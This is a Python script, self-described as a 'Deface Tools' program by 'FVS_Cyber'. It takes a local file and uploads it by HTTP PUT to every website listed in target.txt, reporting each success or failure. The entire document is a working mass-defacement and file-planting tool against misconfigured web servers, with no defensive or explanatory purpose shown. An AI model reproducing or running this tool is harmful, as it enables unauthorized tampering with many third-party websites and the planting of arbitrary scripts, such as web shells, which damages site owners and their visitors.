# -*- coding: utf-8 -*-

try:
    import requests
    import os.path
    import sys
except ImportError:
    exit("install Dependencies error .....")

banner = """
#########################
Deface Tools By FVS_Cyber
#########################
"""

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'


def Exp(GET):
    inpo = ''
    if sys.version_info.major > 2:
        inpo = input(GET)
    else:
        inpo = raw_input(GET)

    return str(inpo)


def manage(script, target_file="target.txt"):
    op = open(script, "r").read()
    with open(target_file, "r") as target:
        target = target.readlines()
        s = requests.Session()
        print("upload to %d website" % (len(target)))
        for web in target:
            try:
                site = web.strip()
                if site.startswith("http://") is False:
                    site = "http://" + site
                req = s.put(site + "/" + script, data=op)
                if req.status_code < 200 or req.status_code >= 250:
                    print(m + "[" + b + " Failed to Upload !" + m + " ] %s/%s" % (site, script))
                else:
                    print(m + "[" + h + " Succes to Upload" + m + " ] %s/%s" % (site, script))

            except requests.exceptions.RequestException:
                continue
            except KeyboardInterrupt:
                print;
                exit()


def main(__bn__):
    print(__bn__)
    while True:
        try:
            a = Exp("input your script/index : ")
            if not os.path.isfile(a):
                print("file '%s' not found" % (a))
                continue
            else:
                break
        except KeyboardInterrupt:
            print;
            exit()

    manage(a)


if __name__ == "__main__":
    main(banner)
